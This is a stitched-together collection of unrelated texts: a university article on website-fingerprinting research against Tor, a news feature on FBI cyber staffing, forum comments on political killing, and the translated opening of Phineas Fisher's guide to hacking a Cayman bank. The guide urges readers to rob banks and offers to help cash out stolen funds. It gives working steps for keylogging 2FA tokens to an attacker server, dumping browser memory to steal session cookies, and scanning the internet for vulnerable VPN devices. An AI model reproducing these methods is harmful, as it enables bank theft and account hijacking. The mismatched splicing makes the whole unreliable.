Payap Sirinam, a computing and information sciences Ph.D. student, was tasked with exploring the potential for deep learning in the website fingerprinting attack.
Adversaries are going to develop this technology themselves anyway, so the RIT team wanted to figure out how future attacks might work.
While the first website fingerprinting attack used machine-learning classifiers with manually developed features to analyze traffic, the team’s new attack would use deep learning, which extracts features automatically.
“You manually train a machine-learning computer to recognize patterns in web traffic that humans can’t see—that’s why it’s so good at this attack,” said Sirinam, who is from Thailand. “By using deep learning, attackers are essentially able to spend less time training, while finding even more patterns that they can use to identify a website.”
The RIT team’s new attack, called Deep Fingerprinting, was based on a Convolutional Neural Network (CNN) that was designed using cutting-edge deep-learning methods. The attack automatically extracts features from packet traces and does not require handcrafting features for classification.
After thousands of hours running trace experiments in a closed-world setting, the new attack outperformed all previous state-of-the-art website fingerprinting attacks. The attack was 98 percent effective against Tor. Even against existing defenses, Deep Fingerprinting had more than 90-percent accuracy.
The Deep Fingerprinting project included work from Sirinam; Professor Wright; Marc Juarez, a Ph.D. student at the Belgian research university KU Leuven; and Mohsen Imani, a former Ph.D. student of Wright’s at University of Texas at Arlington. A paper on the NSF-sponsored work was a finalist for an Outstanding Paper Award, placing it in the top 1 percent of all submitted papers, at the 2018 ACM Conference on Computer and Communications Security in Toronto.
“Now that we know which defenses aren’t going to work against the new top-level attacks, it’s up to us to create defenses that do,” said Sirinam.
Upping our defense
Nate Mathews, a fourth-year computing security major, finds it fun to work with really difficult and ambiguous problems. However, the dilemma he’s currently trying to solve is one that his mentor created.
Working together with Sirinam, Mathews is trying to better understand why the Deep Fingerprinting attack is so effective, in order to develop a defense that can stop it.
Mathews describes deep learning as a black box. Researchers put data in and output arrives at the other end. But it’s difficult to see the inner workings of the box.
“If we could figure out which data features the deep learning thinks is important, we can identify the particular regions to defend,” said Mathews, who is from Ross, Ohio.
To help visualize which parts of a trace are most important to the classification decision made by deep learning, the team is applying the GradCAM technique. Traditionally used in image classification, GradCAM generates heatmaps that show what parts of the trace the deep learning algorithm is focusing on.
Using their findings, Mathews and Sirinam are proposing ways to add fake packets to these important parts of the trace, which can confuse the deep-learning algorithms.
“It’s like adding noise to a picture of a cat, so you can hide what kind of animal it is,” said Wright. “You can add noise to the entire picture, but that’s expensive in our setting. But if we can obscure the ears and the face, it might be enough.”
Saidur Rahman, a computing and information sciences Ph.D. student, and Aneesh Yogesh Joshi, a computer science master’s degree student from India, are also developing a new defense strategy that is meant to trick the deep learning.
Known as the adversarial examples defense, it uses deep learning to add packets and modify website traces in a way that causes the classifier to misclassify.
“We borrowed the idea from the domain of computer vision, where you can distort patterns in the model,” said Rahman, who is from Bangladesh. “This defense can make Facebook traffic look like Google traffic.”
Before implementing any new defense, the team needs to complete thousands of experiments in closed-world and more realistic open-world settings. They also need to take bandwidth and latency overhead into account. If a defense is going to slow the system down to a halt, users may find that the benefits no longer outweigh the cost.
Bolstering the attacks
Taking it one step further, the experts at RIT are trying to find other attacks they could use to test the robustness of their defenses.
They are developing Tik-Tok, an attack that uses packet timing information. Prior attacks discounted timing information because the characteristics change on each visit to a site, making it hard to extract patterns.
“We saw this as a largely untapped resource and something that might benefit from adding deep-learning classifiers,” said Rahman. “We selected and extracted eight new timing features that provide a lot of value.”
Preliminary results indicate that Tik-Tok could be a successful attack in the future.
Sirinam is also developing a new attack and subsequent defense as the last part of his dissertation. Using a branch of deep learning that he borrowed from facial recognition, he plans to create an attack that is more realistic than Deep Fingerprinting.
While the Deep Fingerprinting model may require 1,000 examples from each website to classify correctly, the new n-shot learning with triplet networks concept allows a classifier to learn from only five examples.
“N-shot learning is like an eco-car that requires fewer resources and has reasonably good performance, while the sports car—like Deep Fingerprinting—requires rich resources in order to perform at its best,” said Sirinam. “This shows the danger of website fingerprinting attacks, even with less powerful adversaries, so we need to figure out a way to stop them.”
Wright said that throughout these research projects, the Tor community has been an amazing partner and appreciative of RIT’s efforts. Many of these defenses could be implemented on Tor in the next two to three years.
“We know that our defenses will likely be broken in the future—that’s the nature of cybersecurity,” said Wright. “But we are coming up with solutions that will help people around the world stay safe for the time being, and I think that’s what really matters now.”
Global Cybersecurity Institute
Construction is underway for RIT’s Global Cybersecurity Institute, which will help the university become a nexus of cybersecurity education and research.
The three-story facility will include a cyber learning experience center, a simulated security operations center, labs, and offices. The institute will address the critical workforce needs in cybersecurity through education and professional development programs.
It is expected to open in July 2020 and will be the first facility of its kind in upstate New York.

In the spring of 2017, the Federal Bureau of Investigation was on the cusp of a dramatic overhaul of the agency’s cyber capabilities. The FBI was wrapping up an agency-wide survey, and one option on the table included getting rid of the bureau’s central cyber division altogether and dispersing digital experts throughout its 56 regional offices.
But just days before FBI officials were scheduled to brief the director on the results of the survey, according to a bureau official working there at the time, President Trump fired James Comey, the bureau’s head.
Comey, who says he was fired after refusing to pledge loyalty to the president, recalled that episode at a [recent conference]( in Washington. “I failed to push us to the decision point of how do we want to deploy against this threat aggressively enough,” he said. “Should we have a cyber division or blow it up?”
He never got the opportunity to make that decision, however. Chris Wray, the current FBI director, “is wrestling with that now,” Comey said.
According to Tonya Ugoretz, the deputy assistant director of the bureau’s cyber division, her office isn’t going anywhere. “There are no plans to not have a cyber division,” she told Yahoo News during an interview. The division “is the locus of all our intrusion investigations, whether that’s nation state or criminal.”
Regardless of the structure, the bureau’s top officials recognize a paradigm shift.
In the United States, digital criminals using everything from weaponized botnets to ransomware are attacking private industry and the government on a daily basis, increasing the demand for experts with skills in cybersecurity, intelligence and law enforcement. So, after nearly two decades of focusing on terrorism and intelligence, the FBI is in the midst of an even more intensive shift toward cyber.
While the bureau has a history of being run by agents with guns, more funding and priority is now being funneled into behind-the-scenes digital experts who can watch network traffic and unravel digital trails back to hackers, and who can explain online activity to judges and secure subpoenas for tech companies. The Department of Justice [budget request to Congress for 2019]( asks for $370 million to fund the FBI’s cyber investigations and related work.
Now “every field office has a cyber squad” modeled after lessons learned fighting terrorism, said Ugoretz, speaking earlier this year at a conference in Sea Island, Ga. Some field offices are being assigned as leads for specific attacks or threat actors, she said. There is also a rapid response team that can be deployed out of headquarters in Washington at a moment’s notice.
Yet even as the FBI’s need for cyber experts is increasing, its ability to retain agents and employees with the needed technical expertise is under threat. According to interviews with over a dozen former FBI cyber employees as well as other national security experts, a cyber “brain drain” is taking place at the bureau that could hamper its ability to stem the constant flow of digital threats.
The FBI’s loss comes at a critical time. With the 2020 presidential elections approaching, and concerns about foreign interference as well as theft of trade secrets and intellectual property, the need for cyber experts is likely to increase. “Make no mistake, the threat just keeps escalating,” Wray, the current FBI director, told a Senate panel this week, “and we’re going to have to up our game to stay ahead of it.”
That means more than just focusing on Russian influence campaigns. On Tuesday, Florida Gov. Ron DeSantis announced the FBI has briefed him on 2016 Russian hacks of two county election systems in the state.
“Certainly we expect our adversaries will not only continue to evolve technologically, but they’re also always learning from each other,” Ugoretz told Yahoo News. “Much of the conversation from 2016 and 2018 was about Russian efforts to influence the election. But we’re focused on all threats, whether it’s influence or interference in election infrastructure.”
Some of the FBI’s first forays into the digital world came in the 1990s, when computer crimes started to come under the agency’s purview. In the early days, a large percentage of those cases involved tracking child pornography, like the “Operation Innocent Images” case in 1993 that [revealed]( an online network of child predators based off a search for a missing boy in Brentwood, Md. By 2007, according to the FBI, the bureau opened more than 20,000 similar cases.

In 1994, the bureau caught a glimpse of what has today become common: international adversaries committing crimes online. After multiple large banks noticed $400,000 was missing from their coffers, the FBI [was ultimately led]( to a ring of criminal hackers led by a man in St. Petersburg, Russia. Bigger cases followed, like the FBI’s Moonlight Maze, a sophisticated, ongoing digital campaign to steal military technologies that was ultimately linked back to Moscow.
Tim Gallagher, managing director in the business intelligence and investigations practice at Kroll, a division of global advisory firm Duff & Phelps, first got into the cyber field at the FBI in the late 1990s, working on criminal intrusion cases in a small field office in Ohio. There, he attended one of the first meetings of a task force called [InfraGard]( focused on working with the private sector to protect infrastructure in Cleveland.
From Ohio, Gallagher “saw a gradual shift of pretty much every violation we worked on” to the point that each investigation had “a cyber piece.” It was “not about going in and grabbing evidence out of filing cabinets anymore,” he said.
After the terrorist attacks of Sept. 11, the FBI pivoted from a focus on locking up criminals and busting gangs and drug rings to predicting and stopping the next extremist plot at any cost, bulking up intelligence resources and linking up with foreign intelligence agencies for unprecedented information sharing. In 2002, the FBI’s cyber division at FBI headquarters in Washington was created to pursue investigations of “cyber-based terrorism, espionage, computer intrusions and major cyber fraud.”
The FBI employs a variety of different employees to defend against the cyberthreat at its headquarters, around the country and overseas. “By default, everyone talks about agents and analysts,” said Ugoretz, who arrived at the bureau in 2001.
But the division also employs computer scientists, data scientists and data operation specialists, among others. At FBI field offices, each has a cyber task force, and major cities now host a few dozen cyber experts, while smaller ones may be home only to a handful.
According to multiple former FBI employees, former bureau director Robert Mueller— now better known for his role as the special counsel investigating Russian interference in the 2016 presidential election — worked to professionalize the analyst workforce during his tenure, around the same time the bureau began implementing career tracks, one of which was cyber-focused.
Previously, an agent’s ticket to promotion was[disrupting a possible terrorist plot]( by making an arrest, seizing assets or blocking someone from committing an ideologically motivated crime. But at the end of Mueller’s tenure as FBI director, agents started getting pulled off of counterterrorism squads to work on cyber investigations, and the cyber division was [reorganized]( to focus exclusively on intrusions, i.e., hacks or unauthorized computer access as opposed to crimes that had only a digital component. “Around 2013, the writing was on the wall that cyber was becoming a higher priority than it had ever been before,” said Jim Harris, a former FBI agent who worked on cyber cases and later co-founded a startup.
At the same time, the bureau was applying lessons from fighting terrorism to the digital realm. “The FBI shifted its cyber intrusion emphasis from reacting to cyber-attacks to predicting and preventing them,” [according to]( a 2015 DOJ Inspector General report.
The emphasis on prediction and prevention resulted in other changes. For example, child pornography, a digitally enabled crime that occupied a large amount of cyber agents’ time, was shifted to the criminal division, freeing up other agents to do more intelligence-related work. This shift toward broader national security may have come from a bureauwide effort “because that’s where the money is,” said one former FBI agent who requested anonymity to speak candidly. The FBI “constantly ceded ground to other agencies as a result of this.”
Ugoretz argues the “shift” toward cybercrime has been gradual, and that the bureau’s primary targets have not changed. “I don’t know if I can speak of a specific transition,” she told Yahoo News. “This has been a gradual evolution. The bureau has always adapted to new technologies; I see cyber in much the same way.”
By around 2010, cyber investigations were already bleeding into all of the FBI’s major operational divisions, from counterintelligence to counterterrorism, according to Harris.
In one case, the [bureau arrested]( Hector Xavier Monsegur, known online as Sabu, for hacking private U.S. businesses and government agencies, then used him as an informant to indict other hackers. The bureau [spent years]( hunting down terrorists disseminating propaganda and committing crimes online. In more recent years, the bureau has been at the forefront of the biggest cyber cases in modern history, including Russian interference in the 2016 U.S. presidential election and Chinese state-directed hacking.
In a recent case from January of this year, a U.S. company and its 600 or so employees suffered a ransomware attack that “completely crippled their operations,” threatening to shut down the business entirely, said Ugoretz. However, the cyber division had experience with the perpetrator, and intelligence that enabled them to help unlock the company’s files and restore operations in three days.

While the bureau’s major arrests in cyber cases often make headlines, the numbers are too small to make a significant dent in cyber crime, according to analysis from national security think tank Thirdway, which[determined]( that the FBI is arresting the perpetrators in less than 1 percent of malicious cyberattacks.
Part of the problem is that cyber crimes are committed by a variety of people and organizations, ranging from nation states and criminals to terrorists and organized criminal gangs, according to Jim Baker, the former FBI general counsel now working on cybersecurity and workforce issues at R Street, a think tank. Because of the overlapping responsibilities involved in dealing with those different types of threats, “the cyber division has a bit of an identity crisis,” said Baker, who noted he is a supporter of the division despite its issues.
The problem that Baker refers to can be seen in both the lower and higher levels of the FBI. Over the last two years, the press has tracked several high-profile departures from the FBI’s senior cyber leadership. In July of last summer, the Wall Street Journal [revealed]( three top FBI cyber officials were leaving within the same month, and [Politico detailed]( the loss of about 20 “cybersecurity leaders” — a fraught time for the FBI with a near constant barrage of criticism from the president.
At the top levels, the investigation into Hillary Clinton’s email server and routine attacks from President Trump have taken a toll, according to several former FBI officials. But the cyber brain drain is affected by many factors, and as the FBI transitioned from a building run by agents with guns to an agency full of technical experts, retention of those with cyber skills has become a major problem.
Both senior officials and more junior FBI employees are eyeing the door or have already left for a number of reasons, according to former FBI employees who spoke with Yahoo News. One of the major issues they cited has been the relationship between the field offices and headquarters, and the lack of clarity on how cyber skills would be incorporated into cases.
The question for Comey, who was weighing the plan to eliminate the cyber division, was whether having a part of the bureau dedicated to a specific criminal vector, like the internet, made sense. After all, the bureau never created an automobile division, despite the revolutionary shift in crime cars brought about. “Criminals were suddenly moving at breathtaking speeds at distances we couldn’t imagine,” he said. “The challenge for the FBI was, you couldn’t have an automobile division. …Everybody had to learn to drive.”
Experts argue that Comey’s comments make sense, and that the bureau needs to require a certain level of digital literacy and cyber know-how across the board to confront the issue.
“Criminal reliance on technology is so great that cyber competence is an essential, not specialized, part of law enforcement,” said Mieke Eoyang, vice president of the national security program of think tank ThirdWay, who is currently researching FBI and workforce issues. “Unfortunately, we don’t see law enforcement developing a strategic, coherent approach to integrating cyber into their skill set.”
Ugoretz challenged the notion that the bureau is pivoting toward “cyber” crime the same way it reorganized to focus on terrorism. “The way cyber is talked about, it’s as if it’s something wholly unique, not something that’s connected to everything we do,” she said. “I think that’s not correct.”
“I know there’s been some analogies made to the post 9/11 shift in resources ... [but] it’s about making sure everyone, no matter what they’re working, has the perspective of whatever targets they’re working, whether it’s a criminal, nation state, hacktivist, how they’re using cyber-means to meet their objectives,” she said.
The essential challenge is how to make the entire bureau digitally competent. That includes providing basic digital training in how to apply for subpoenas to get information about a post on an online forum or on a social media website, remarked one former FBI cyber manager. However, the true technical work involved in intrusions is so “in the weeds” that many are not interested or not capable of developing those skills, the former manager said.
Multiple former FBI employees told Yahoo that part of the problem is that the bureau has been dominated by agents, while other employees with the specialized technical skills — sometimes dubbed “tech ninja wizards” — have little opportunity for advancement, according to one former FBI employee.
Employees also found the bureaucracy and paperwork associated with the FBI can be “crushing,” said one former FBI cyber employee. This is particularly true for anyone used to working in Silicon Valley. “You may have this grand vision of entering into a career of awesome cyber investigations and come to the realization that half your time will be paperwork.”
That paperwork, argued Ugoretz, is there for a reason. “Our primary mission that’s in really giant letters in the lobby is about preserving the Constitution and protecting the American people, and we can’t forget that part.”
Some employees with technical skills felt their talents were being underutilized due to bureaucratic ranking systems. “The bureau sucks at retaining people,” said one former FBI agent. “They actively drive talent away because they do not let the people they hired for their skills use the skills they were hired for in the first place.”
One of the biggest concerns for the bureau is competition from the private sector. Over recent years, the other intelligence agencies, particularly the NSA, suffered an exodus of talent amid disruptive reorganizations, clashes between military leadership and a civilian workforce, and lucrative salaries on the outside. The bureau is now facing a similar fate, though several former FBI employees interviewed by Yahoo said the bureaucratic roadblocks make it more difficult for the FBI to reward talented young cyber employees based on their rank, whereas NSA is better positioned to do that.
“It’s a highly competitive marketplace for talent,” said Gallagher, the former FBI special agent who now works at Kroll. “There’s literally over a million vacant cybersecurity jobs around the country.”
Even the FBI efforts to train employees, as opposed to recruiting cyber experts, can backfire. According to four of the former FBI employees interviewed by Yahoo, the FBI’s cyber training is extremely valuable — so valuable that it often allows them to find lucrative jobs in the private sector. It was after the training phase that people started leaving.
“The FBI is kind of a victim of its own success,” said one retired FBI agent. “Some people who landed in the cyber track felt like they were trapped,” the official explained, unable to return to criminal cases and play the field.
Former FBI cyber employees who spoke to Yahoo, as well as others whose departures were publicly announced, left the bureau for jobs in banks, consulting jobs, threat intelligence firms and even the NFL.
One of the reasons the FBI employees in New York leave is they can’t afford to live there on a government salary, a problem that extends to other tech hubs like San Francisco, Boston and Washington. High-ranking FBI employees can make in the six figures, but multiple former FBI employees, both agents and other employees, told Yahoo News their salaries often doubled or rose substantially when making the jump to the private sector. Seeking promotion within cyber roles at the bureau is also difficult, according to one former FBI cyber supervisor. “If you want to stay in cyber, promotion is unbelievably hard,” he said.
Even beyond the FBI’s own internal problems, it also faces challenges from inside government. As is often the case within the vast federal bureaucracy, cyber is subject to turf battles among agencies. The U.S. Secret Service is moving into cyber investigations, and routinely brings financial cases forward, and the Department of Homeland Security, created in 2002 following the 9/11 attack, has expanded into defending the nation’s networks and critical infrastructure from cyberattacks. In November 2018, the Trump administration mandated the creation of the Cybersecurity and Infrastructure Security Agency within the DHS.
Both the DHS and the FBI work with the private sector, and handle sensitive information on breaches, but the FBI and the Department of Justice serve as the lead for responding to a cyberattack, collecting evidence and tracking down those responsible, while DHS is in charge of “asset” response, offering technical assistance to prevent further damage.
Those lines aren’t always clear cut, however. “They’re constantly stepping on each other’s toes,” said one former FBI cyber employee, though cooperation has improved over time, others said.
While bureaucratic infighting and difficulties keeping talent are not necessarily new issues to the federal government, they are likely to be critical as the FBI prepares for the 2020 election. And behind the scenes, the FBI’s leadership appears to now be recognizing problems with retaining its cyber workforce, and within the last several months, the bureau began conducting a survey on retention of cyber employees, according to one source who received a copy of the questionnaire.
According to the FBI, the voluntary attrition rate for special agents in 2018 was .5 percent, while 2 to 3 percent chose to leave the cyber division.
“This isn’t just an FBI issue,” said Ugoretz, said of retention issues. “There’s certainly great demand in the government, private sector, academia, everywhere for people with cyber skill.”
Even despite complaints and concerns, nearly every former FBI employee who spoke to Yahoo News said they have thought about going back to government, nearly all citing the bureau’s national security mission as a primary factor.
But experts argue fixing the FBI’s problems, and retaining employees, will require major changes directed from the top, as well as support from Congress and the White House. Baker, the retired FBI general counsel, said that’s what Mueller did following 9/11, and something of that magnitude will be required now.
“The FBI is well aware of the seriousness of the cyberthreat and that it must organize itself to deal effectively with that threat. Doing so will require leadership and effective management,” said Baker.
“Some china is going to have to be broken,” he concluded.

to murder is to forfeit the moral argument.  in terms of cognitive bias alone, better to err towards never killing - i could cite ethical reasons as well, but they are well worn. (we condemn state orchestrated murder, AP is just a decentralized tyrant doing same)
"the street finds its own uses for things"
the beauty of mass resistance is that the tools are already prevalent.
we have a beautiful reference case unfolding before us:
 choose no murder
choose mass resistance

a false dichotomy; it would be better if no one was killed at all!
again, false dichotomy; these are not the only two possibilities - better to not kill anyone!
if this is about universal healthcare, then i agree: people are needlessly dying without being explicitly murdered, and we should fix this too! ;)
i agree. i cannot force anyone. i can only highlight the fallacy of using murder to right wrongs. expedient? sure. but call it vengeance, not justice nor moral.

see also: Translation notes:
Bulk of translation done by Google Translate (which did a remarkably good job outside of slang and computer terms!), with edits for clarity and formatting by  I got the Spanish version from the bottom of this article, it’s in the leak: The UR article also has a lot of info about the history of Phineas’s hacks and resources she’s provided to the community in the past, and Crimethinc has some interviews with her. She’s also posted video interviews (a puppet and a voice actor reading chat logs, lol) and a screencast of her hacking a police department :)
Sources are mostly left as in the original, except where there was an obvious directly translated english version lying around. Phineas Fisher frequently cites the original HackBack guide in Spanish. The English version is here:  The resources and content may not be precisely the same between the two, so if you’re interested I’d recommend also running the Spanish one through gtranslate.
Phineas, if you read this, the stuff you do is awesome and please never stop! I’m so glad you wrote this to accompany your leak, to educate people about important political topics and how to use computer skills to improve the world we live in. It’s difficult to radicalize people with these skillsets because of the salaries we get offered to sell out and be white-hat, and it’s difficult to get people who are already radicalized into hacking (at least in any kind of numbers) because the vast majority of them don’t have time to spend months or years getting the background knowledge to break into a modern network. The bug bounty and anarchist reading material you provided helps with the first, and the accessible infosec education portion helps with the second. I will definitely be sending this to people in both camps.
On a personal note, I was also really happy that you referred to yourself publicly as a girl, there aren’t many other female anarchists or hackers that I’ve met, much less someone I’ve thought was so incredible for years now. OPSEC be damned, you’re inspirational as fuck, thank you for what you do.

              By Subcowmandante Marcos
I am a wild child
Innocent, free, wild
I am all ages
My grandparents live on in me
I am a brother of the clouds
And I only know how to share
I know that everything belongs to everyone,
That everything is alive in me
My heart is a star
I am a son of the earth
Traveling aboard my spirit
I walk to eternity
These are my simple words that seek to touch the hearts of people who are simple and humble, but also dignified and rebellious.  These are my simple words to tell about my hacks, and to invite other people to hack with cheerful rebellion.
I hacked a bank. I did it to give an injection of liquidity, but this time from below and to the simple and humble people who resist and rebel against injustices throughout the world. In other words: I robbed a bank and gave away the money.  But it wasn't me alone who did it. The free software movement, the offensive powershell community, the metasploit project and the hacker community in general are what made this hack possible. The exploit.in community made it possible to convert intrusion into a bank's computers into cash and bitcoin. The Tor, Qubes and Whonix projects, together with the cryptographers and activists who defend privacy and anonymity, are my nahuales, that is, my protectors [1]. They accompany me every night and make it possible for me to remain free.
I did nothing complicated. I only saw the injustice in this world, felt love for all beings, and expressed that love in the best way I could, through the tools I know how to use. Hate does not move me to banks, or to the rich, but a love for life, and the desire for a world where everyone can realize their potential and live a full life. I would like to explain a little how I see the world, so that you can get an idea of how I came to feel and act like this. And I also hope that this guide is a recipe that you can follow, combining the same ingredients to bake the same cake. Who knows, out there these powerful tools could end up also serving you to express the love you feel.
We are all innocent, free, wild wild children
We are all brothers of the trees children of the earth
We just have to put in our hearts a burning star
(song by Alberto Kuselman and Chamalú)
The police will invest a chingo of resources to investigate me. They think the system works, or at least it will work once they catch all the “bad boys”. I am nothing more than the product of a system that does not work. As long as there is injustice, exploitation, alienation, violence and ecological destruction, many more will come like me: an endless series of people who will reject as illegitimate the bad system responsible for this suffering. That badly done system is not going to get fixed by arresting me. I am only one of the millions of seeds that Tupac planted 238 years ago in La Paz [2], and I hope that my actions and writings water the seed of rebellion in their hearts.
[1]  [2]  It was before he was killed by the Spaniards, just a day like yesterday, that he said that "they will only kill me, but tomorrow I will return and be millions."

To make us listen, hackers sometimes have to cover their faces, because we are not interested you in seeing our face but instead in understanding our word.  The mask can be from Guy Fawkes, Salvador Dalí, from Fsociety, or in some cases the puppet of a crested toad. By affinity, this time I went to dig up a dead man to lend me his balaclava. I think then that I should clarify that Sup Marcos is innocent of all that is told here because, besides being dead, I did not consult him. I hope that his ghost, if he finds out from a Chiapaneca hammock, knows how to find the goodness to, as they say there, "dismiss this deep fake" with the same gesture with which an unwelcome insect moves away - which could well be a beetle.
Even so with the balaclava and the name change, many of those who support my actions may pay too much attention to my person. With their own autonomy shattered for a lifetime of domination, they will be looking for a leader to follow, or a hero who saves them. But behind the balaclava, I'm just a girl. We are all wild children. We just have to place a star in the beds in our hearts.
[1 - Why expropriate]
Capitalism is a system in which a minority has come to appropriate a vast majority of the world's resources through war, theft and exploitation.  By snatching the commons [1], they forced those below to be under the control of that minority that owns everything.  It is a system fundamentally incompatible with freedom, equality, democracy and the Suma Qamaña (Good Living). It may sound ridiculous to those of us who have grown up in a propaganda machine that taught us that capitalism is freedom, but in truth what I am saying is not a new or controversial idea [2]. The founders of the United States of America knew they had to choose between creating a capitalist society, or a free and democratic society.  Madison recognized that "the man who possesses wealth, the one who lies on his couch or rolls in his carriage, cannot judge the wishes or feelings of the day laborer."  But to protect against the "spirit of equalization" of landless day laborers, it seemed to him that only landowners should vote, and that the government had to serve to "protect the opulent minority against the great majority."  John Jay was more to the point and said: "Those who own the country should rule it."

Evgeny, the great ignored elephant, doesn't understand why everyone pretends not to see him on the panels on climate change, so here I give him a chance to say his lines.
In the same way that bell hooks [3] argues that the rejection of the patriarchal culture of domination is an act in defense of the male's own interest (since it emotionally mutilates them and prevents them from feeling full love and connection), I think that the culture of domination of capitalism has a similar effect on the rich, and that they could have fuller and more satisfying lives if they rejected the class system from which they believe they benefit.  For many, class privilege amounts to a childhood of emotional neglect, followed by a life of superficial social interactions and meaningless work. In the end they may know that they can only genuinely connect with people when they work with them as their peers, and not when they put them at their service. They may know that sharing their material wealth is the best they can do with it. You may also know that the significant experiences, connections and relationships that count are not those that come from business interactions, but precisely to reject the logic of the market and give without expecting anything in return. They may know that all they need to escape from their prison and really live is to get carried away, give up control, and take a leap of faith. But most lack courage.
Then it would be naive of us to direct our efforts to try to produce some kind of spiritual awakening in the rich [4].  As Astata Shakur says: "No one in the world, no one in history, has ever achieved his freedom by appealing to the moral sense of his oppressors". In fact, when the rich divide their money, they almost always do it in a way that reinforces the system that allowed them to amass their enormous and illegitimate wealth [5]. And change is unlikely to come through a political process; As Lucy Parsons says: "Let us never be fooled that the rich will let us vote to take away their wealth." Colin Jenkins justifies the expropriation with these words [6]:
Make no mistake, expropriation is not theft. It is not the confiscation of money earned "with the sweat of the forehead". It is not theft of private property. It is, rather, the recovery of enormous amounts of land and wealth that have been forged with stolen natural resources, human slavery, forced labor force and amassed in hundreds of years by a small minority. This wealth ... is illegitimate, both for moral purposes and for the exploitation mechanisms that have been used to create it.
For Colin, the first step is that “we have to free ourselves from our mental ties (believing that wealth and private property have been earned by those who monopolize them; and that, therefore, they should be something to respect, revere, and even  something to pursue), open our minds, study and learn from history, and recognize this illegitimacy together”. Here are some books that have helped me with this: [7] [8] [9] [10] [11].
 According to Barack Obama, economic inequality is "the challenge that defines our time."  Computer hacking is a powerful tool to combat economic inequality.  The former director of the NSA, Keith Alexander, agrees and says that hacking is responsible for "the greatest transfer of wealth in history."

 [2 - Introduction]
This guide explains how I hacked the Cayman Bank and Trust Company (Isle of Man).  Why am I publishing this, almost four years later?
 1) To show what is possible
Hackers working for social change have limited themselves to developing security and privacy tools, DDoS, performing vandalism and leaks. Wherever you go, there are radical projects for a social change in a complete state of precariousness, and there would be much that they could do with some expropriated money. At least for the working class, bank robbery is something socially accepted, and those who do are seen as heroes of the people. In the digital age, robbing a bank is a non-violent, less risky act, and the reward is greater than ever. So why are only black hat hackers doing it for their personal benefit, and never hacktivists to finance radical projects? Maybe they don't think they are capable of doing it. The big bank hacks are on the news every so often, such as the hacking of the Bank of Bangladesh [1], which was attributed to North Korea, or the hacking of banks attributed to the Carbanak group [2], which they describe as a very large and well organized group of Russian hackers, with different members who would be specialized in different tasks. But, it is not that complicated.
It is because of our collective belief that the financial system is unquestionable that we exercise control over ourselves, and maintain the class system without those above having to do anything [3]. Being able to see how vulnerable and fragile the financial system really is helps us break that collective hallucination. That is why banks have a strong incentive not to report hacks, and to exaggerate how sophisticated the attackers are. None of the financial hacks I made, or those I've known, have ever been reported. This is going to be the first, and not because the bank wanted to, but because I decided to publish it.
As you are about to learn in this home guide, hacking a bank and transferring money through the SWIFT network does not require the support of any government or a large and specialized group.  It is something totally possible being a mere amateur hacker, with only public tools and basic knowledge of how to write a script.
[1] [2] [3]  2) Help withdraw cash
Many of those who read this already have, or with a little study will be able to acquire, the skills needed to carry out a hack like this.  However, many will find that they lack the necessary criminal connections to get the handles in condition. In my case, this was the first bank that hacked, and at that time I only had a few and mediocre accounts ready to withdraw the cash (known as bank drops), so it was only a few hundred thousand that I could withdraw at total, when it is normal to get millions. Now, on the other hand, I do have the knowledge and connections to get cash more seriously, so if you are hacking a bank but need help to convert that into real money, and you want to use that money to finance radical social projects, you can contact me.
 3) Collaborate
It is possible to hack banks as an amateur who works alone, but the net is that, in general, it is not as easy as I paint it here.  I was lucky with this bank for several reasons:
1. It was a small bank, so it took me much less time to understand how everything worked.
2. They had no procedure to check the sent swift messages.  Many banks have one, and you need to write code to hide your transfers from their monitoring system.
3. They only used password authentication to access the application with which they connected to the SWIFT network. Most banks now use RSA SecurID, or some form of 2FA.  You can skip this by typing code to get an alert when your token enters, so you can use it before it expires. It's simpler than it seems: I used Get-Keystrokes [1], modifying it so that instead of storing the pressed keys, a GET request is made to my server every time it is detected that they have entered a username. This request adds the username to the url and, as they type the token, several GETs are made with the token digits concatenated to the url. On my side I leave this running in the meantime:
  ssh me at my_secret_server 'tail -f /var/log/apache2/access_log'
 while read i; do echo $i; aplay alarma.wav &> /dev/null; done
 If it is a web application, you can skip the 2FA by stealing the cookie after they have authenticated. I am not an APT with a team of coders who can make me customized tools. I am a simple person who subsists on what the terminal gives [2], so what I use is:
procdump64 /accepteula -r -ma PID_of_browser
 strings64 /accepteula * .dmp |  findstr PHPSESSID 2> nul
 or going through findstr rather than strings, which makes it much faster:
findstr PHPSESSID * .dmp> tmp
     strings64 /accepteula tmp |  findstr PHPSESSID 2> nul
Another way to skip it is to access your session with a hidden VNC (hvnc) after they have authenticated, or with a little creativity you could also focus on another part of their process instead of sending SWIFT messages directly.
I think that if I collaborated with other experienced bank hackers we could hack hundreds of banks like Carnabak, instead of doing one from time to time on my own.  So if you have experience with similar hacks and want to collaborate, contact me.  You will find my email and my PGP key at the end of the previous guide [3].

 [3 - Be careful out there]
It is important to take some simple precautions.  I will refer to this same section of my last guide [1], since it seems to work just fine [2]. All I have to add is that, in Trump's words, "Unless you catch hackers in the act, it is difficult to determine who was doing the hacking," so the police are getting more and more creative [3][4] in their attempts to grab criminals in the act (when their encrypted hard drives are unlocked). So it would be nice if for example you carry a certain bluetooth device and configure your computer to turn off when it moves beyond a certain range, or when an accelerometer detects movement, or something like that.
It may be that writing long articles detailing your actions and your ideology is not the safest thing in the world (oops!), but at times I feel I have to.
 If I didn't believe in who listens to me
 If I didn't believe in what hurts
 If I didn't believe in what's left
 If I didn't believe in what I fought
 What a thing ...
 What was the club without a quarry?
[1] [2] [3] [4]  Many blame queer people for the decline of this society;
 we are proud of it
 Some believe we want to reduce to ashes
 this civilization and its moral fabric;
 They couldn't be more right
 They often describe us as depraved, decadent and revolting
 But alas! They haven't seen anything yet
 [4 - Get access]
In another place [1] I talked about the main ways to get initial access to a company's network during a targeted attack. However, this was not a targeted attack. I did not set out to hack a specific bank, what I wanted was to hack any bank, which ends up being a much simpler task.  This type of nonspecific approach was popularized by Lulzsec and Anonymous [2]. As part of the earlier essay, I prepared an exploit and post-exploitation tools for a popular VPN device. Then I started scanning the entire internet with zmap and zgrab to identify other vulnerable devices [3]. I had the scanner save the vulnerable IPs, along with the common and alt names of the device's SSL certificate, the device's Windows domain names, and the reverse DNS lookup of the IP. I grepped the results for the word "bank", and there were plenty to choose from, but the truth is that I was attracted to the word "Cayman", and that's how I came to choose this one.
[1] [2] [3]  [4.1 - The Exploit]
